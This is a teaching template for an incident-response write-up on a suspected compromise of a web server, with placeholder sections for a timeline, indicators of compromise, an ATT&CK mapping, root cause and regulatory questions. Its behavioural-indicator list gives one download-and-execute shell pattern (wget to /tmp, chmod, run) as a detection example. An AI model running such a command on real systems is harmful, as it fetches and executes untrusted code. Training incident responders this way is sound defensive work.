# Post-Incident Write-Up Template — IR-2026-014 — Suspected Compromise of web-prod-02

This file is a curriculum template students fill in as part of the mini-project deliverable.

**Write-up ID:** IR-2026-014
**Status:** Draft / Final
**Author(s):** <your-name>
**Date drafted:** <YYYY-MM-DD>
**Distribution:** Executive team, Legal, Engineering leadership, Outside counsel

---

## 1. Executive summary

(150-220 words. Non-technical language. Answers, in order: what happened, when, what we did, what is the impact, what is the status now.)

> ...

---

## 2. Incident timeline

(Refer to the produced TIMELINE.md. Do not duplicate the full table here; reproduce the 10-15 most consequential rows below and refer the technical reader to the full timeline in the appendix.)

| Time (UTC) | Source | Event |
|---|---|---|
| <YYYY-MM-DDTHH:MM:SSZ> | <source> | <one-line event> |
| ... | ... | ... |

---

## 3. Indicators of compromise (IOCs)

(Refer to the produced IOCs.json for the machine-readable export. Reproduce a human-readable summary here, grouped by category.)

### Network IOCs

- `<ip-address>` — first-seen through last-seen — confidence: high/medium/low
- `<domain>` — ...
- `<url>` — ...

### Host IOCs

- File: `<path>` — SHA-256 `<hash>` — first seen <timestamp>
- User: `<username>` — UID `<number>` — created <timestamp>
- Cron: `<crontab entry>` — installed <timestamp>
- ...

### Behavioural IOCs

- The sequence `wget <url> -O /tmp/<dropped> && chmod +x && /tmp/<dropped>` from a sudo-elevated session.
- ...

---

## 4. MITRE ATT&CK mapping

(Refer to the produced ATTCK-MAP.md for the full mapping. Reproduce here a summary by tactic.)

| Tactic | Techniques observed |
|---|---|
| Initial Access | T1190 (Exploit Public-Facing Application), T1078 (Valid Accounts) |
| Execution | T1059.004 (Unix Shell) |
| Persistence | T1136.001 (Local Account), T1053.003 (Cron) |
| Privilege Escalation | T1548.003 (Sudo and Sudo Caching) |
| Credential Access | T1003.008 (/etc/passwd and /etc/shadow) |
| Discovery | T1083 (File and Directory Discovery) |
| Collection | T1005 (Data from Local System), T1560.001 (Archive via Utility) |
| Exfiltration | T1041 (Exfiltration Over C2 Channel) |
| Defence Evasion | T1070.003 (Clear Command History) |

---

## 5. Root-cause analysis

### Proximate cause

(One paragraph: the specific action that triggered the incident.)

> ...

### Contributing causes

(One paragraph per cause: the conditions that allowed the proximate cause to result in the observed impact.)

- **<contributing cause 1>**: ...
- **<contributing cause 2>**: ...
- **<contributing cause 3>**: ...

### Systemic cause

(One paragraph: the process or organisational issue that allowed the contributing causes to exist.)

> ...

---

## 6. Containment, eradication, and recovery narrative

### Containment

(One or two paragraphs: what we did to stop the bleeding.)

> ...

### Eradication

(One or two paragraphs: what we did to remove the cause.)

> ...

### Recovery

(One or two paragraphs: how we returned the system to known-good state and validated it.)

> ...

---

## 7. Lessons learned

(Bulleted list of action items. Each item has an owner and a due date.)

- **Action item 1:** ... — owner: <name> — due: <date>
- **Action item 2:** ... — owner: <name> — due: <date>
- **Action item 3:** ... — owner: <name> — due: <date>
- ...

---

## 8. Regulatory considerations

(For each question, state Yes / No / Indeterminate, with a one-sentence justification. The legal team owns the disclosure decision; the IR write-up supplies the facts.)

- **Was personal data involved (GDPR Article 4(1))?** ...
- **Was payment-card data involved (PCI-DSS section 3)?** ...
- **Was protected health information involved (HIPAA Security Rule)?** ...
- **Was material non-public information involved (US securities law)?** ...
- **Did the incident affect critical national infrastructure (NIS2 in EU; CIRCIA-covered entity in US)?** ...
- **Did the incident cause regulator-reportable downtime?** ...

---

## Appendix A — Full timeline

(Refer to the produced TIMELINE.md. Embed or link.)

## Appendix B — Custody log

(Refer to the produced custody-log.md. Embed or link.)

## Appendix C — Volatility 3 plugin outputs

(If memory analysis was performed: list the plugin invocations and their outputs.)

## Appendix D — Raw command transcript

(Every command the IR team ran on the affected host, in order, with timestamps.)
